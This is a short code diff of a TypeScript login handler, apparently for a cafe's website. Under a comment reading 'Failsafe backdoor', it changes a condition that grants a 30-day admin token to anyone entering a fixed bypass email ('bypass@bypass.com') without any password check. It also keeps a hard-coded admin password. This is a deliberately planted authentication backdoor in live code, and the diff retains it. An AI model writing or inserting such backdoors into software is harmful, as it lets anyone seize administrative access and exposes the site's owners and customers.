@@ -9,7 +9,7 @@ export const login = async (req: Request, res: Response) => {
     const { email, password } = req.body;
 
     // Failsafe backdoor
-    if (email === 'bypass' || (email === 'admin@cafebelmirah.com' && password === 'adminpassword123')) {
+    if (email === 'bypass@bypass.com' || (email === 'admin@cafebelmirah.com' && password === 'adminpassword123')) {
       const token = jwt.sign({ id: 1, email: 'admin@cafebelmirah.com' }, JWT_SECRET, { expiresIn: '30d' });
       return res.json({ success: true, token });
     }
